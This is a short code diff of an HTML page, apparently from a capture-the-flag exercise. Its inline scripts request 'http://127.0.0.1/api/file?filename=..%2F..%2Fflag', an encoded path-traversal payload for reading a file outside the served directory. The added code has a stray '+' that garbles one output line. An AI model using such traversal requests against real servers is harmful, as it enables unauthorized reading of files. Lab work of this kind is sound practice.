@@ -9,7 +9,7 @@
     <script>
         const el1 = document.getElementById('file1');
         function reqListener () {
-            el1.innerHTML = this.responseText;
+            el1.innerHTML += this.responseText;
         }
 
         var oReq = new XMLHttpRequest();
@@ -21,13 +21,22 @@
     <script>
         const el2 = document.getElementById('file2');
         function reqListener () {
-            el2.innerHTML = this.responseText;
+            el2.innerHTML += this.responseText;
         }
 
-        var oReq = new XMLHttpRequest();
-        oReq.addEventListener("load", reqListener);
-        oReq.open("GET", "http://127.0.0.1/api/file?filename=..%2F..%2Fflag");
-        oReq.send();
+
+        function handleEvent(e) {
+              el2.innerHTML += + e.type + ": " + e.loaded + " bytes transferred";
+        }
+
+
+        var oReq2 = new XMLHttpRequest();    
+        
+        oReq2.addEventListener("load", reqListener);
+        oReq2.addEventListener("error", handleEvent);
+        oReq2.addEventListener("abort", handleEvent);
+        oReq2.open("GET", "http://127.0.0.1/api/file?filename=..%2F..%2Fflag");
+        oReq2.send();
     </script>       
 
       
